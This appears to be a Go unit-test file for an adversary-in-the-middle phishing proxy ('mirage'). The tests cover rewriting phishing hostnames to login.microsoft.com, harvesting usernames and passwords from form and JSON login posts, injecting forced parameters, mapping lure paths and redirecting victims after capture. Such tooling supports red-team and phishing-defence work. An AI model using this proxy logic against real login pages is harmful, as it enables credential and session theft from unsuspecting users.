package proxy

import (
	"bufio"
	"io"
	"net"
	"net/http"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// helper to build a *aitm.ConfiguredPhishlet from a definition and optional config.
func configured(def *aitm.Phishlet, cfgs ...*aitm.PhishletConfig) *aitm.ConfiguredPhishlet {
	var cfg *aitm.PhishletConfig
	if len(cfgs) > 0 {
		cfg = cfgs[0]
	} else {
		cfg = &aitm.PhishletConfig{Name: def.Name}
	}
	return &aitm.ConfiguredPhishlet{Definition: def, Config: cfg}
}

// ── intercept ────────────────────────────────────────────────────────────────

func TestIntercept_MatchingPath(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		Intercepts: []aitm.InterceptRule{{
			Path:        regexp.MustCompile(`^/api/telemetry$`),
			StatusCode:  200,
			ContentType: "application/json",
			Body:        `{"status":"ok"}`,
		}},
	}), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodPost, "https://login.phish.local/api/telemetry", strings.NewReader(`{}`))

	rule := c.matchIntercept(req)
	if rule == nil {
		t.Fatal("expected intercept to match the request")
	}
	if rule.StatusCode != 200 {
		t.Errorf("status = %d, want 200", rule.StatusCode)
	}
	if !strings.Contains(rule.Body, `"status":"ok"`) {
		t.Errorf("body = %q, want intercept body", rule.Body)
	}
}

func TestIntercept_NonMatchingPath(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		Intercepts: []aitm.InterceptRule{{
			Path:       regexp.MustCompile(`^/api/telemetry$`),
			StatusCode: 200,
		}},
	}), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodGet, "https://login.phish.local/dashboard", nil)

	if rule := c.matchIntercept(req); rule != nil {
		t.Fatal("expected intercept NOT to match non-matching path")
	}
}

// ── URL rewriting ────────────────────────────────────────────────────────────

func TestRewriteURL_HostAndScheme(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com", UpstreamScheme: "https"},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.example.com"},
	), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodGet, "https://login.phish.example.com/oauth2", nil)
	c.rewriteURL(req)

	if req.Host != "login.microsoft.com" {
		t.Errorf("Host = %q, want %q", req.Host, "login.microsoft.com")
	}
	if req.URL.Scheme != "https" {
		t.Errorf("Scheme = %q, want %q", req.URL.Scheme, "https")
	}
}

func TestRewriteURL_OriginHeader(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com", UpstreamScheme: "https"},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.example.com"},
	), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodPost, "https://login.phish.example.com/login", nil)
	req.Header.Set("Origin", "https://login.phish.example.com")
	c.rewriteURL(req)

	if got := req.Header.Get("Origin"); got != "https://login.microsoft.com" {
		t.Errorf("Origin = %q, want %q", got, "https://login.microsoft.com")
	}
}

func TestRewriteURL_StripsSessionCookie(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "example.com", UpstreamScheme: "https"},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.local"},
	), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodGet, "https://login.phish.local/page", nil)
	req.AddCookie(&http.Cookie{Name: SessionCookieName, Value: "sess-123"})
	req.AddCookie(&http.Cookie{Name: "other", Value: "keep"})
	c.rewriteURL(req)

	for _, cookie := range req.Cookies() {
		if cookie.Name == SessionCookieName {
			t.Error("expected __ss cookie to be stripped")
		}
	}
}

// ── credential extraction ────────────────────────────────────────────────────

func TestExtractCredentials_FormPost(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		Login: aitm.LoginSpec{Domain: "login.example.com"},
		Credentials: aitm.CredentialRules{
			Username: aitm.CredentialRule{Key: regexp.MustCompile(`^username$`), Search: regexp.MustCompile(`^(.+)$`), Type: "post"},
			Password: aitm.CredentialRule{Key: regexp.MustCompile(`^password$`), Search: regexp.MustCompile(`^(.+)$`), Type: "post"},
		},
	}), &aitm.Session{ID: "s1"})
	c.server.SessionSvc = &stubSessionSvc{}

	req := testReq(http.MethodPost, "https://login.example.com/login", strings.NewReader("username=alice&password=s3cret"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	c.extractCredentials(req)

	if c.session.Username != "alice" {
		t.Errorf("Username = %q, want %q", c.session.Username, "alice")
	}
	if c.session.Password != "s3cret" {
		t.Errorf("Password = %q, want %q", c.session.Password, "s3cret")
	}
}

func TestExtractCredentials_JSON(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		Login: aitm.LoginSpec{Domain: "login.example.com"},
		Credentials: aitm.CredentialRules{
			Username: aitm.CredentialRule{Key: regexp.MustCompile(`email`), Search: regexp.MustCompile(`"email"\s*:\s*"([^"]+)"`), Type: "json"},
			Password: aitm.CredentialRule{Key: regexp.MustCompile(`password`), Search: regexp.MustCompile(`"password"\s*:\s*"([^"]+)"`), Type: "json"},
		},
	}), &aitm.Session{ID: "s1"})
	c.server.SessionSvc = &stubSessionSvc{}

	req := testReq(http.MethodPost, "https://login.example.com/api/login", strings.NewReader(`{"email":"alice@example.com","password":"s3cret"}`))
	req.Header.Set("Content-Type", "application/json")
	c.extractCredentials(req)

	if c.session.Username != "alice@example.com" {
		t.Errorf("Username = %q, want %q", c.session.Username, "alice@example.com")
	}
}

// ── force post ───────────────────────────────────────────────────────────────

func TestForcePost_InjectsParam(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		ForcePosts: []aitm.ForcePost{{
			Path: regexp.MustCompile(`^/login$`),
			Conditions: []aitm.ForcePostCondition{{
				Key: regexp.MustCompile(`^email$`), Search: regexp.MustCompile(`^.+$`),
			}},
			Params: []aitm.ForcePostParam{{Key: "login_source", Value: "web"}},
		}},
	}), &aitm.Session{ID: "s1"})

	req := testReq(http.MethodPost, "https://login.example.com/login", strings.NewReader("email=alice&password=s3cret"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	c.injectForcePost(req)

	body, _ := io.ReadAll(req.Body)
	if !strings.Contains(string(body), "login_source=web") {
		t.Errorf("expected login_source=web injected, got: %s", string(body))
	}
}

// ── lure path rewrite ────────────────────────────────────────────────────────

func TestRewriteLurePath_MatchingPath(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{Login: aitm.LoginSpec{Path: "/login"}}), &aitm.Session{ID: "s1"})
	c.lure = &aitm.Lure{Path: "/p/abc123"}

	req := testReq(http.MethodGet, "https://login.phish.local/p/abc123", nil)
	c.rewriteLurePath(req)

	if req.URL.Path != "/login" {
		t.Errorf("Path = %q, want %q", req.URL.Path, "/login")
	}
}

func TestRewriteLurePath_NonMatchingPath(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{Login: aitm.LoginSpec{Path: "/login"}}), &aitm.Session{ID: "s1"})
	c.lure = &aitm.Lure{Path: "/p/abc123"}

	req := testReq(http.MethodGet, "https://login.phish.local/dashboard", nil)
	c.rewriteLurePath(req)

	if req.URL.Path != "/dashboard" {
		t.Errorf("Path = %q, want %q", req.URL.Path, "/dashboard")
	}
}

// ── completed session redirect ───────────────────────────────────────────────

func TestHandleRequest_CompletedSession_Redirects(t *testing.T) {
	now := time.Now()
	c := testConn(configured(&aitm.Phishlet{}), &aitm.Session{ID: "s1", CompletedAt: &now})
	c.lure = &aitm.Lure{RedirectURL: "https://real-site.com/dashboard"}

	// Use a pipe to capture the raw response written to rawConn.
	clientConn, serverConn := net.Pipe()
	defer clientConn.Close()
	defer serverConn.Close()
	c.rawConn = serverConn

	req := testReq(http.MethodGet, "https://login.phish.local/anything", nil)

	go c.handleRequest(req)

	resp, err := http.ReadResponse(bufio.NewReader(clientConn), req)
	if err != nil {
		t.Fatalf("reading response: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusFound {
		t.Errorf("status = %d, want 302", resp.StatusCode)
	}
	if got := resp.Header.Get("Location"); got != "https://real-site.com/dashboard" {
		t.Errorf("Location = %q, want %q", got, "https://real-site.com/dashboard")
	}
}
